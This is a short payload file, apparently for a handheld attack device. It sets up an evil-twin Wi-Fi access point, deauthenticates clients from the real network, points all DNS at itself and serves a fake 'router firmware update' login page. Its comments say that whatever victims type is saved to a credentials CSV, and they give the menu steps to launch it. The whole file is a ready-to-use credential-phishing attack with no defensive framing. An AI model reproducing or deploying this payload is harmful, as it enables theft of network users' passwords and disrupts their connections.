# Vandeta ucmitm payload - "router firmware update" login over the twin.
#
# The form posts back to the twin, so whatever is typed is written to
# /BruceEvilCreds/ucmitm_creds.csv and shown on the run screen. No Wi-Fi
# password is needed to run it.
#
#   MITM Attack > ucmitm: on > Network > pick the AP > Payload > fake-router.ucmitm

twin
deauth on
page * html/router-login.html
dns * this
